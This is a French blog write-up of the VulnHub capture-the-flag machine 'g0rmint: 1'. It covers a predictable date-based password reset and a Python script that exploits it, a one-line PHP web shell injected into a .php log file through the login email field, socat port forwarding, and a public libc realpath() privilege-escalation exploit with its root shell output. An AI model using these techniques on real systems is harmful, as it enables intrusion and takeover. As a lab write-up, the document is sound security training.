# Solution du CTF g0rmint: 1 de VulnHub

Yeh Bik Gayi Hai Gormint
------------------------

*g0rmint* est le nom [d'un CTF disponible sur VulnHub](https://www.vulnhub.com/entry/g0rmint-1,214/) et aussi le nom d'un [meme Internet indien](http://theindianidiot.com/aunty-gormint-memes/) qui a inspiré ce CTF.  

Il s'agit d'un boot2root qui a au moins le bénéfice de ne pas compter un port knocking et une recherche Google débile comme [ce shitty Cyberry](https://www.vulnhub.com/entry/cyberry-1,217/) (c'est pour ça que je ne ferais pas de walkthrough de ce dernier).  

Tout ça pour ça
---------------

```plain
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:4e:fd:98:4e:ae:5d:0c:1d:32:e8:be:c4:5b:28:d9 (RSA)
|_  256 9b:48:29:39:aa:f5:22:d3:6e:ae:52:23:2a:ae:d1:b2 (ECDSA)
80/tcp    open     http       Apache httpd 2.4.18
| http-robots.txt: 1 disallowed entry
|_/g0rmint/*
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 404 Not Found
```

On a une pléthore de ports fermés, deux ports ouverts et une dizaine de filtrés. *Nmap* nous trouve facilement un dossier sur le serveur web via le *robots.txt*.  

Arrivé sur ledit dossier on est rédirigé vers */g0rmint/login.php*. Le site a aussi une fonctionnalité de reset de password via *reset.php* qui nécessite de saisir une adresse email et le nom d'utilisateur correspondant (mais il n'y a aucune liste d'utilisateurs).  

On remarque bien sûr rapidement la présence d'un tag HTML méta inhabituel dans la page de login :  

```html
<meta name="backup-directory" content="s3cretbackupdirect0ry"">
```

Un check rapide de ce dossier à la racine web et sous */g0rmint* ne semble rien retourner (erreur 404), du coup je passe à autre chose.  

Une recherche de fichiers PHP permet de retrouver d'autres pages:  

```plain
http://192.168.1.42/g0rmint/config.php - HTTP 200 (0 bytes, plain)
http://192.168.1.42/g0rmint/dummy.php - HTTP 302 (0 bytes, plain) redirects to ../login.php
http://192.168.1.42/g0rmint/footer.php - HTTP 200 (45 bytes, plain)
http://192.168.1.42/g0rmint/header.php - HTTP 200 (1404 bytes, gzip)
http://192.168.1.42/g0rmint/index.php - HTTP 302 (0 bytes, plain) redirects to login.php
http://192.168.1.42/g0rmint/login.php - HTTP 200 (1892 bytes, gzip)
http://192.168.1.42/g0rmint/logout.php - HTTP 302 (0 bytes, plain) redirects to login.php
http://192.168.1.42/g0rmint/mainmenu.php - HTTP 200 (300 bytes, gzip)
http://192.168.1.42/g0rmint/profile.php - HTTP 302 (0 bytes, plain) redirects to login.php
http://192.168.1.42/g0rmint/reset.php - HTTP 200 (1783 bytes, gzip)
http://192.168.1.42/g0rmint/secrets.php - HTTP 302 (0 bytes, plain) redirects to login.php
```

Le fichier *header.php* est particulièrement intéressant car il semble faire partie d'une zone authentifié du site et fait référence à un compte *Noman Riffat* qui est l'auteur du CTF.  

![g0rmit CTF header.php](https://raw.githubusercontent.com/devl00p/blog/master/images/g0rmint.png)

Un peu de recherche Google nous permet de retrouver le mail de la personne : *w3bdrilld3r@gmail.com*.  

Effectivement le compte est reconnu puisqu'on peut provoquer la réinitialisation du mot de passe en rentrant l'email et le nom d'utilisateur *noman*...  

Après avoir bien sûr essayé de trouver une faille quelconque sur ces formulaires force est de constater qu'ils sont protégés.  

Faut-il alors tenter d'intercepter le mail pour obtenir le mot de passe ? Sachant que l'on contrôle les paramètres réseau de la VM ça semble un peu tricher et le challenge serait irréalisable avec certaines config réseau. Je laisse donc tomber l'idée.  

Ce qui semble plus probable c'est que l'algorithme de réinitialisation du mot de passe se base sur la date qui est affichée en évidence en bas des pages...  

Du coup j'ai essayé des mots de passe correspondants au timestamp avec une bonne marge de 24h, avec le résultat d'un *rand()* suivant un *srand()* prenant comme entrée le timestamp et aussi quelques exemples de fonction de génération de mots de passe utilisant *rand()* ou *mt\_rand()*... sans succès.  

Après un bon moment je retourne jeter un œil à ce soit disant *s3cretbackupdirect0ry*.  

On sait que le serveur web est un Apache et on sait qu'Apache a l'habitude de répondre 403 sur des .htaccess/.htpasswd même si ces fichiers sont absents.  

Or il s'avère qu'on a des codes d'erreur différents selon le répertoire :  

```plain
$ curl -I http://192.168.1.42/s3cretbackupdirect0ry/.htaccess
HTTP/1.1 404 Not Found
Date: Fri, 08 Feb 2018 20:21:33 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
```

contre

```plain
$ curl -I http://192.168.1.42/g0rmint/s3cretbackupdirect0ry/.htaccess
HTTP/1.1 403 Forbidden
Date: Fri, 09 Feb 2018 20:22:18 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
```

Dans le premier cas le dossier *s3cretbackupdirect0ry* n'existe pas et l'erreur 404 s'arrête à l'absence du dossier (la présence du *.htaccess* n'est pas vérifiée) alors que dans le second cas le serveur nous retourne un 403 pour le *.htaccess* prouvant que le dossier existe.  

Après résolution du CTF j'ai fouillé dans la conf *Apache* et n'ai vu aucune directive particulière... je suppose que c'est le comportement par défaut si on demande un dossier ne contenant pas d'index avec le listing des répertoires désactivé...  

White box
---------

Via un peu de brute-force on trouve dans ce fameux dossier un fichier *info.php* faisant référence à *backup.zip*.  

L'archive contient une copie de l'arborescence web mais on devine assez vite qu'il n' s'agit pas exactement de la même version, à commencer par un dump de la base MySQL qui n'indique qu'un compte *demo* qui ne fonctionne pas sur le site et sans le nom *noman* que l'on a trouvé précédemment.  

Ce qui nous intéresse c'est bien évidemment le mécanisme d'authentification et de réinitialisation du mot de passe.  

```php
<?php
include_once('config.php');
$message = "";
if (isset($_POST['submit'])) { // If form is submitted
    $email = $_POST['email'];
    $user = $_POST['user'];
    $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND username = :user");
    $sql->bindParam(":email", $email);
    $sql->bindParam(":user", $user);
    $row = $sql->execute();
    $result = $sql->fetch(PDO::FETCH_ASSOC);
    if (count($result) > 1) {
        $password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
        $password = md5($password);
        $sql = $pdo->prepare("UPDATE g0rmint SET pass = :pass where id = 1");
        $sql->bindParam(":pass", $password);
        $row = $sql->execute();
        $message = "A new password has been sent to your email";
    } else {
        $message = "User not found in our database";
    }
}
?>
```

Comme on s'y attendait l'utilisation de PDO protège efficacement des attaques SQL.  

On voit qu'un double hashage est généré à partir de la date telle qu'affichée sur le site.  

```php
$email = $_POST['email'];
$pass = md5($_POST['pass']);

$sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND pass = :pass");
```

Et lors du login, seul le hash md5() est réalisé. Le mot de passe à saisir correspond donc aux 20 premiers caractères du hash sha1 de la date.  

On peut écrire un script de réinitialisation en Python :  

```python
from hashlib import sha1, md5

import requests
from bs4 import BeautifulSoup

data = {
    "email": "w3bdrill3r@gmail.com",
    "user": "noman",
    "submit": "reset"
}

response = requests.post("http://192.168.1.42/g0rmint/reset.php", data=data)

soup = BeautifulSoup(response.text, "lxml")

date_text = soup.find("b").text.strip()
print("Date is '{}'".format(date_text))
pass1 = sha1(date_text.encode()).hexdigest()[:20]
print("pass is", pass1)

response = requests.post(
    "http://192.168.1.42/g0rmint/login.php",
    data={
        "email": "w3bdrill3r@gmail.com",
        "pass": pass1,
        "submit": "submit"
    },
    allow_redirects=True
)

if "Login to your account" in response.text:
    print("fail")
else:
    print("success")
```

Write what where
----------------

On a beau être authentifié, il n'y a pas d'über fonctionnalités sur le site.  

La page de login fait tout de même un appel intéressant lors des tentatives de connexion infructueuses :  

```php
$log = $email;
$reason = "Failed login attempt detected with email: ";
addlog($log, $reason);
```

Cette fonction est définie dans le fichier *config.php* :  

```php
function addlog($log, $reason) {
    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
    if (file_exists($myFile)) {
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    } else {
        $fh = fopen($myFile, 'w');
        fwrite($fh, file_get_contents("dummy.php") . "<br>\n");
        fclose($fh);
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\n");
    }
    fclose($fh);
}
```

Le code est fait de telle façon que les fichiers de logs écrits avec l'extension *.php* commencent toujours par le contenu de *dummy.php* qui bloque l'accès si l'on est pas authentifié, donc pas de problèmes pour nous.  

Ici on contrôle l'email et donc le premier paramètre de *addlog()*. Il ne reste plus qu'une difficulté à savoir le script réécrit les valeurs de $\_POST en appliquant un *addslashes()* dessus, il faut donc faire attention à ce que l'on passe comme email si on ne veut pas cramer le code PHP que l'on souhaite injecter.  

Le code suivant passe parfaitement :  

```php
<?php system($_GET[chr(99)]); ?>
```

Un [shell PTY](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_bind.py) plus tard, et après n'avoir pas trouvé de moyens classiques de passer root, je décide de fouiller dans la base SQL.  

Une petite redirection *socat* pour la forme : *socat TCP4-LISTEN:3366,fork,reuseaddr TCP4:127.0.0.1:3306*  

Mais la base s'avère inintéressante et les identifiants SQL ne sont pas réutilisés...  

Baby don't hurt me
------------------

Finalement j'ai eu recourt à [un exploit de halfdog](https://www.exploit-db.com/exploits/43775/) pour une vulnérabilité touchant la fonction *realpath()* de la libc :  

```plain
www-data@ubuntu:/tmp$ ./whatislove
./whatislove: setting up environment ...
Detected OS version: "16.04.3 LTS (Xenial Xerus)"
./whatislove: using umount at "/bin/umount".
No pid supplied via command line, trying to create a namespace
CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.
Namespaced filesystem created with pid 7195
Attempting to gain root, try 1 of 10 ...
Starting subprocess
Stack content received, calculating next phase
Found source address location 0x7ffd91510aa8 pointing to target address 0x7ffd91510b78 with value 0x7ffd9151223f, libc offset is 0x7ffd91510a98
Changing return address from 0x7f2563cbe830 to 0x7f2563d5de00, 0x7f2563d6aa20
Using escalation string %69$hn%73$hn%1$25557.25557s%67$hn%1$1.1s%71$hn%1$6991.6991s%68$hn%72$hn%1$11003.11003s%70$hn%1$13280.13280s%66$hn%1$8704.8704s%1$2694.2694s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s
Executable now root-owned
Cleanup completed, re-invoking binary
/proc/self/exe: invoked as SUID, invoking shell ...
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
flag.txt
# cat flag.txt
Congrats you did it :)
Give me feedback @nomanriffat
```

Après avoir consulté d'autres walkthrough il s'avère qu'il y avait un autre fichier *backup.zip* contenant un identifiant pour l'utilisateur du système *g0rmint* membre du groupe sudo.  

```plain
# find /var/www/ -name "backup.zip"
/var/www/html/g0rmint/s3cretbackupdirect0ry/backup.zip
/var/www/backup.zip
```

Whatever...  


*Published February 09 2018 at 18:46*